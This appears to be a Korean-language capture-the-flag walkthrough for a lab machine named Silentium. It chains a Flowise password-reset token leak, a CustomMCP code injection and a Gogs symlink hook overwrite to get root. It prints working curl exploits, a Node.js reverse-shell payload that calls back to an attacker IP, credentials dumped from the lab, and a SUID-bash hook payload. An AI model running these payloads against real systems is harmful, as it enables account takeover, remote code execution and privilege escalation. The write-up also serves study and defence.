# Silentium

## Overview

가짜 금융회사 웹사이트로 위장한 Linux 머신이다. 공격 체인은 다음과 같다. ffuf vhost 열거로 내부에서 동작하는 Flowise 인스턴스를 식별하고, CVE-2025-58434(비밀번호 재설정 토큰 응답 본문 노출)로 admin 계정을 탈취한다. 이후 `x-request-from: internal` 헤더를 발견하여 인증된 세션으로 CVE-2025-59528(CustomMCP Node.js 코드 인젝션)을 통해 Docker 컨테이너 내부에 root 리버스 쉘을 획득한다. 컨테이너 환경변수에서 SSH 크리덴셜(`SMTP_PASSWORD`)을 탈취하여 호스트에 `ben`으로 접속해 user 플래그를 획득한다. 권한 상승은 내부 포트 3001에서 root로 실행되는 Gogs 0.13.3을 대상으로 CVE-2025-64111(Symlink를 통한 pre-receive hook 덮어쓰기)을 수행해 SUID bash를 생성하고 root 권한을 획득한다.

---

## Target Information

| 항목 | 내용 |
|------|------|
| 머신 이름 | Silentium |
| OS | Ubuntu 24.04.4 LTS |
| IP | 10.129.245.103 |
| 난이도 | Easy |
| 주요 취약점 | CVE-2025-58434 (Flowise 비밀번호 재설정 토큰 노출), CVE-2025-59528 (Flowise CustomMCP RCE), CVE-2025-64111 (Gogs Symlink to RCE) |
| 주요 기술 | vhost 열거, 이메일 열거, API 취약점 체이닝, Node.js 소켓 리버스 쉘, 컨테이너 탈출(환경변수), Git hook 주입 |

---

## Enumeration

### TCP Port Scan

```bash
nmap -sC -sV 10.129.245.103
```

![nmap scan](images/nmap_port22_80_silentium.png)

열린 포트는 두 개다.

| 포트 | 서비스 | 버전 |
|------|--------|------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | HTTP | nginx 1.24.0 (Ubuntu) |

HTTP 서버는 `http://silentium.htb`로 리다이렉트한다.

```bash
echo "10.129.245.103 silentium.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration

`http://silentium.htb`에 접속하면 가짜 금융회사(Silentium) 랜딩 페이지가 표시된다. 페이지에는 Loan Calculator 섹션이 있어 서버 API 호출 가능성이 있어 보이지만, `assets/app.js`를 확인하면 계산 로직이 완전히 클라이언트 사이드에서 처리되며 서버로 요청을 보내지 않는다. nginx가 존재하지 않는 모든 경로에 200(메인 페이지, 8753바이트)으로 응답하는 와일드카드 구조라 gobuster에 `--exclude-length` 옵션이 필요하다.

```bash
gobuster dir -u http://silentium.htb \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,json -t 50 --exclude-length 8753
```

![gobuster result](images/gobuster_wildcard_excluded_assets_found.png)

`/assets`만 발견되어 메인 도메인은 공격면이 없음을 확인한다.

### Subdomain Enumeration

nginx가 vhost 기반으로 라우팅하는 구조이므로 서브도메인을 열거한다. 메인 페이지 크기 8753바이트를 `-fs`로 필터링한다.

```bash
ffuf -u http://silentium.htb \
  -H "Host: FUZZ.silentium.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 8753
```

![ffuf vhost result](images/ffuf_vhost_result_staging_200.png)
![ffuf_vhost_fuzzing_staging_discovered](images/ffuf_vhost_fuzzing_staging_discovered.png)
`staging` 서브도메인이 Size 3142로 다른 응답을 반환한다. `/etc/hosts`에 추가 후 접속하면 Flowise 로그인 페이지가 표시된다.

```bash
echo "10.129.245.103 staging.silentium.htb" | sudo tee -a /etc/hosts
```

---

## Initial Foothold

### Flowise 서비스 식별

`http://staging.silentium.htb`에 접속하면 Flowise 로그인 페이지가 표시된다. 버전을 확인한다.

```bash
curl -s http://staging.silentium.htb/api/v1/version
# {"version":"3.0.5"}
```

![flowise version auth](images/flowise_version_3.0.5_auth_required.png)

Flowise 3.0.5는 두 개의 CVE에 취약하다.

| CVE | CVSS | 설명 |
|-----|------|------|
| CVE-2025-58434 | 9.8 | forgot-password API 응답 본문에 tempToken 평문 노출 |
| CVE-2025-59528 | 10.0 | CustomMCP 노드의 mcpServerConfig가 `Function()` 생성자에 비검증 입력 전달 → RCE |

인증 여부를 먼저 확인한다.

```bash
curl -s -i http://staging.silentium.htb/api/v1/chatflows
# HTTP/1.1 401 Unauthorized
```

인증이 활성화되어 있다. 먼저 CVE-2025-58434로 admin 계정을 탈취하고, 이후 CVE-2025-59528로 RCE를 수행하는 체이닝 전략을 취한다.

### CVE-2025-58434 — 이메일 열거

로그인 엔드포인트는 계정 존재 여부에 따라 서로 다른 상태코드를 반환한다. 이를 이용해 유효한 이메일을 식별한다.

```bash
# 존재하는 이메일 → 401 "Incorrect Email or Password"
curl -s -i -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"wrongpassword"}'

# 존재하지 않는 이메일 → 404 "User Not Found"
curl -s -i -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent@silentium.htb","password":"wrongpassword"}'
```

![email enumeration](images/flowise_email_enumeration_401_vs_404.png)

응답 코드가 401(계정 존재)과 404(계정 없음)로 명확히 갈린다. 메인 페이지에서 확인한 팀원 이름 중 **Ben**(Head of Financial Systems)이 Flowise 같은 내부 AI 워크플로우 도구를 관리할 가능성이 높고, `ben@silentium.htb`가 401을 반환했다. 유효한 계정임이 확인됐다.

### CVE-2025-58434 — 비밀번호 재설정 토큰 탈취

정상적인 forgot-password 흐름은 토큰을 이메일로 발송해야 하지만, Flowise 3.0.5는 **HTTP 응답 본문에 tempToken을 그대로 포함**하여 반환한다. 요청 바디 구조가 `{"user": {...}}` 형식으로 중첩되어야 서버 코드가 올바르게 파싱한다.

```bash
curl -s -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

![forgot password token exposed](images/CVE-2025-58434_forgot-password_tempToken_exposed.png)

응답에서 `"name":"admin"`, `"tempToken":"QN86q6..."` 등이 그대로 노출된다. `ben@silentium.htb`가 admin 계정임을 확인했고, tempToken으로 비밀번호를 즉시 재설정한다.

```bash
# 비밀번호 재설정
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"<TOKEN>","password":"Passw0rd1234"}}'

# 로그인 + 쿠키 저장
curl -s -c cookies.txt -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"Passw0rd1234"}'
```

응답에 `"name":"admin"`, `"isOrganizationAdmin":true`가 포함되어 admin 로그인에 성공했다.

![flowise admin dashboard](images/flowise_admin_dashboard_logged_in.png)

### x-request-from: internal 헤더 발견

admin 세션 쿠키로 API를 호출하면 여전히 401이 반환된다. 브라우저 개발자도구 Network 탭에서 실제 웹 UI가 보내는 요청을 분석하면, Flowise 프론트엔드가 모든 API 요청에 **`x-request-from: internal`** 헤더를 추가하고 있음을 발견한다. 서버 미들웨어가 이 헤더의 존재 여부로 내부 웹 UI 요청과 외부 요청을 구분한다.


이후 모든 API 요청에 이 헤더를 추가하면 인증이 정상 통과된다.

```bash
curl -s -b cookies.txt http://staging.silentium.htb/api/v1/chatflows \
  -H "x-request-from: internal"
# []
```

### CVE-2025-59528 — CustomMCP RCE

CVE-2025-59528은 Flowise의 CustomMCP 노드 설정값(`mcpServerConfig`)이 `Function()` 생성자에 검증 없이 전달되어 임의 JavaScript가 실행되는 취약점이다. Node.js 런타임에서 실행되므로 `process.mainModule.require('child_process')`를 통해 OS 명령 실행까지 이어진다.

포트 4444 등 raw TCP 아웃바운드가 차단되어 `/dev/tcp` 방식 리버스 쉘이 실패한다. HTTP 아웃바운드는 허용된다는 것을 먼저 확인한 뒤, Node.js의 `net` 모듈로 소켓을 직접 생성하여 동일한 경로를 통해 차단을 우회한다.

```bash
# nc 리스너 시작
nc -lvnp 8080

# Node.js net 모듈 기반 리버스 쉘 페이로드
curl -s -b cookies.txt -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){ const net=process.mainModule.require(\"net\"); const cp=process.mainModule.require(\"child_process\"); const s=net.createConnection(8080,\"10.10.14.40\"); s.on(\"connect\",function(){ const sh=cp.spawn(\"/bin/sh\",[\"-i\"],{stdio:[s,s,s]}); sh.on(\"close\",function(){ s.destroy(); }); }); return 1; })()})"}}'
```

![reverse shell success](images/CVE-2025-59528_nodejs_reverse_shell_success.png)

`/ #` 프롬프트와 `id` 결과로 컨테이너 내부에서 root 쉘이 획득됐다.

---

## Container Enumeration & Lateral Movement

### 컨테이너 환경 파악

```bash
id && hostname
# uid=0(root) gid=0(root) — hostname: c78c3cceb7ba

cat /proc/self/status | grep -i cap
# CapEff: 00000000a00425fb
```

![container id root](images/container_id_root_hostname_c78c3cceb7ba.png)

`CapEff: 00000000a00425fb` — Privileged 컨테이너가 아니다(Privileged는 `ffffffff`). 표준 컨테이너 탈출은 불가능하다.

### 환경변수에서 크리덴셜 탈취

컨테이너 환경변수를 덤프한다.

```bash
env | grep -iE "pass|key|secret|token|host"
```

![container env credentials](images/container_env_credentials_leaked.png)

```
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
SMTP_HOST=mailhog
```

Docker 실행 시 `-e` 옵션으로 주입된 크리덴셜이 평문으로 노출된다. `SMTP_PASSWORD=r04D!!_R4ge`는 사람이 직접 사용하는 서비스 패스워드 형식이다.

### 호스트 SSH 접속 (크리덴셜 재사용)

`ip route`로 확인한 Docker 게이트웨이 `172.18.0.1`은 컨테이너 네트워크에서 본 호스트 IP다. 외부에서는 `10.129.245.103`과 동일한 머신이다. nmap에서 SSH 포트가 열려있었으므로 탈취한 크리덴셜로 시도한다.

```bash
ssh ben@10.129.245.103
# password: r04D!!_R4ge
```

![ssh ben login](images/ssh_ben_initial_login_host_confirmed.png)

`ben@silentium:~$` — 호스트 머신에 `ben`으로 접속 성공했다. SMTP 서비스 크리덴셜이 SSH 계정에 재사용된 것이다.

```bash
cat ~/user.txt
```

![user flag](images/user_flag.png)

---

## Privilege Escalation — ben → root

### 내부 서비스 열거

sudo -l은 권한 없음을 반환한다. 내부 포트와 root 프로세스를 열거한다.

```bash
ss -tlnp
```

![internal ports](images/host_ss_internal_ports_37747_3001_3000.png)

```bash
ps aux | grep root | grep -v '\['
```

![ps aux root processes](images/host_ps_aux_root_processes_gogs_flowise_docker.png)

**`root 1495 /opt/gogs/gogs/gogs web`** — Gogs가 root 권한으로 실행 중이다. Gogs의 모든 작업(Git hook 포함)이 root 권한으로 처리된다는 의미다. 내부 포트 3001에서 동작한다.

### Gogs 설정 분석

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

![gogs app ini config](images/gogs_appini_full_config.png)

| 항목 | 값 | 의미 |
|------|-----|------|
| RUN_USER | root | Gogs 프로세스가 root로 실행 |
| HTTP_PORT | 3001 | 내부(127.0.0.1)에서만 접근 가능 |
| ROOT | /root/gogs-repositories | 레포지토리 저장 경로 |
| DISABLE_REGISTRATION | false | 누구나 계정 생성 가능 |
| [email] ENABLED | false | 이메일 기능 비활성화 |

### CVE-2025-64111 개요

CVE-2025-64111은 Gogs ≤ 0.13.3에서 파일 업데이트 API(`PUT /api/v1/repos/{owner}/{repo}/contents/{path}`)가 심링크의 목적지를 검증하지 않는 취약점이다. 공격자가 `.git/hooks/pre-receive`를 가리키는 심링크를 커밋하고, API로 그 심링크에 악성 스크립트를 써 넣으면 다음 push 시 Gogs가 root 권한으로 해당 hook을 실행한다.

| 항목 | 내용 |
|-----|------|
| CVE | CVE-2025-64111 |
| CVSS | 9.3 (Critical) |
| 영향 버전 | Gogs ≤ 0.13.3 (패치: 0.13.4) |
| 필요 권한 | 인증된 일반 유저 |
| 공격 유형 | Symlink Path Traversal → pre-receive hook RCE |

### SSH 포트 포워딩으로 Gogs 접근

Gogs는 `127.0.0.1:3001`에만 바인딩되어 외부에서 직접 접근이 불가능하다. SSH 로컬 포트 포워딩으로 터널을 구성한다.

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.245.103
```

Kali 로컬 3001 포트를 SSH 터널을 통해 타겟 내부 `127.0.0.1:3001`로 포워딩한다. `DISABLE_REGISTRATION=false`이므로 브라우저에서 bugi 계정을 신규 등록하고 API 토큰을 발급받는다.

```bash
echo "127.0.0.1 staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
```

### CVE-2025-64111 Exploit

**1단계: 타겟 레포지토리 생성**

```bash
curl -s -i -X POST http://127.0.0.1:3001/api/v1/user/repos \
  -H 'Authorization: token <TOKEN>' \
  -H 'Content-Type: application/json' \
  -d '{"name":"test_manual","private":false,"auto_init":false}'
```

**2단계: 심링크 생성 및 push**

pre-receive hook 파일을 가리키는 심링크를 로컬 repo에 커밋하고 push한다.

```bash
cd /tmp && mkdir manual_exploit && cd manual_exploit
git init
git config user.email "bugi@test.com" && git config user.name "bugi"

# 심링크 타겟: 레포지토리의 pre-receive hook 실제 경로
ln -s /root/gogs-repositories/bugi/test_manual.git/hooks/pre-receive evil_link
git add -f evil_link && git commit -m "init"
git remote add origin http://bugi:password@127.0.0.1:3001/bugi/test_manual.git
git push -u origin master
```

![symlink push success](images/CVE-2025-64111_symlink_pre-receive_push_success.png)

**3단계: API로 심링크를 통해 pre-receive hook 덮어쓰기**

Gogs API는 심링크의 목적지를 검증하지 않아 PUT 요청이 실제로는 `/root/gogs-repositories/bugi/test_manual.git/hooks/pre-receive` 파일에 쓰여진다. 페이로드는 SUID bash 생성이다.

```bash
# 페이로드 base64 인코딩
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' | base64 -w 0
# IyEvYmluL2Jhc2gKY3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2ggJiYgY2htb2QgK3MgL3RtcC9yb290YmFzaAo=

# PUT으로 심링크를 통해 hook 덮어쓰기
curl -s -i -X PUT 'http://127.0.0.1:3001/api/v1/repos/bugi/test_manual/contents/evil_link' \
  -H 'Authorization: token <TOKEN>' \
  -H 'Content-Type: application/json' \
  -d '{"message":"pwn","content":"IyEvYmluL2Jhc2gKY3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2ggJiYgY2htb2QgK3MgL3RtcC9yb290YmFzaAo=","sha":"<BLOB_SHA>"}'
```

![put hook payload 201](images/CVE-2025-64111_put_hook_payload_201.png)

`201 Created` 응답 확인. 응답에 `"type":"symlink","target":"...hooks/pre-receive"`가 포함되어 심링크를 통한 쓰기가 성공했음이 확인된다.

**4단계: push로 pre-receive hook 트리거**

```bash
echo "trigger" > pwn.txt && git add pwn.txt
git commit -m "trigger" && git push origin master
```

![trigger push hook executed](images/CVE-2025-64111_trigger_push_hook_executed.png)

push 시 Gogs 서버가 root 권한으로 `pre-receive` hook을 실행한다. SUID bash가 생성된다.

### root 권한 획득 및 root 플래그

```bash
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root ... /tmp/rootbash

/tmp/rootbash -p

id
# uid=1000(ben) gid=1000(ben) euid=0(root) egid=0(root)
```

![privesc success rootbash](images/CVE-2025-64111_suid_rootbash_privesc_success.png)

`-p` 옵션은 bash가 SUID를 무시하고 권한을 낮추는 기본 동작을 방지한다. `euid=0(root)` — 루트 권한 획득에 성공했다.

```bash
cat /root/root.txt
```

![root flag](images/root_flag.png)

---

## Vulnerability Root Cause Analysis

| 취약점 | 위치 | 근본 원인 | OWASP |
|--------|------|-----------|-------|
| CVE-2025-58434 (이메일 열거) | Flowise 로그인 API | 계정 존재 여부에 따른 응답 코드/메시지 차이로 이메일 열거 가능 | A07 |
| CVE-2025-58434 (토큰 노출) | Flowise forgot-password API | 비밀번호 재설정 임시 토큰이 이메일 발송 없이 HTTP 응답 본문에 평문 노출 | A02 |
| CVE-2025-59528 (RCE) | Flowise CustomMCP 노드 | `mcpServerConfig` 입력값이 `Function()` 생성자에 비검증 전달 → 임의 Node.js 코드 실행 | A03 |
| 환경변수 크리덴셜 노출 | Docker 컨테이너 환경변수 | SSH 크리덴셜이 컨테이너 환경변수에 평문으로 주입되어 RCE 시 즉시 노출 | A02 |
| 크리덴셜 재사용 | SSH 계정 | SMTP 서비스 패스워드가 호스트 SSH 계정에 동일하게 사용 | A07 |
| CVE-2025-64111 (Symlink RCE) | Gogs PUT Contents API | 파일 업데이트 API가 심링크 목적지를 검증하지 않아 레포지토리 외부 파일 덮어쓰기 가능 | A01 |
| root 권한 실행 | Gogs 서비스 설정 | Git hook이 Gogs 프로세스 권한(root)으로 실행되어 hook 덮어쓰기가 즉시 root RCE로 이어짐 | A05 |

### 실제 환경에서의 위험성

CVE-2025-58434에서 핵심은 forgot-password 응답이 이메일 발송 없이 토큰을 그대로 반환한다는 점이다. 비밀번호 재설정 흐름에서 토큰은 반드시 외부 채널(이메일)을 통해서만 전달되어야 한다.

CVE-2025-59528의 근본 원인은 사용자 입력을 동적 코드 평가(`Function()`, `eval()`)에 직접 전달하는 것이다. JSON 파서가 아닌 자바스크립트 평가자를 사용해 설정값을 파싱하는 설계 자체가 문제다. Flowise 3.0.6에서는 `Function()` 호출을 `JSON5.parse()`로 교체하여 수정됐다.

Gogs를 root로 실행하는 것은 최소 권한 원칙의 명백한 위반이다. Git 서비스는 전용 서비스 계정으로 실행해야 하며, hook 스크립트가 서버 프로세스의 권한을 그대로 상속받지 않도록 격리 메커니즘을 적용해야 한다. CVE-2025-64111은 Gogs 0.13.4에서 패치됐다.

---

## Attack Chain Summary

| 단계 | 기술 | 도구 |
|------|------|------|
| 포트 스캔 | TCP 서비스 열거 | nmap |
| 디렉토리 열거 | 와일드카드 필터링 | gobuster |
| 서브도메인 열거 | vhost 기반 서브도메인 탐색 | ffuf |
| 서비스 식별 | Flowise 버전 확인 및 CVE 매핑 | curl |
| 이메일 열거 | 응답 코드 차이로 유효 이메일 식별 | curl |
| 계정 탈취 | CVE-2025-58434 — 응답 본문 tempToken 탈취 → 비밀번호 재설정 | curl |
| 인증 우회 | x-request-from: internal 헤더 발견 | 브라우저 개발자도구 |
| RCE | CVE-2025-59528 — CustomMCP Function() 인젝션 | curl |
| 리버스 쉘 | Node.js net 모듈 소켓 기반 TCP 우회 | nc |
| 크리덴셜 탈취 | Docker 컨테이너 환경변수 덤프 | env |
| Lateral Movement | SMTP 크리덴셜 재사용으로 SSH 접속 | ssh |
| 내부 서비스 탐색 | 내부 포트 열거 및 root 프로세스 식별 | ss, ps |
| 포트 포워딩 | SSH 로컬 포트 포워딩으로 Gogs 접근 | ssh -L |
| 심링크 push | CVE-2025-64111 — pre-receive hook 심링크 커밋 | git |
| hook 덮어쓰기 | API로 심링크를 통해 hook에 SUID bash 페이로드 주입 | curl |
| 권한 상승 | push로 hook 트리거 → SUID bash 생성 → euid=root | git, bash |
| 플래그 획득 | SUID bash로 root 파일 읽기 | rootbash -p, cat |
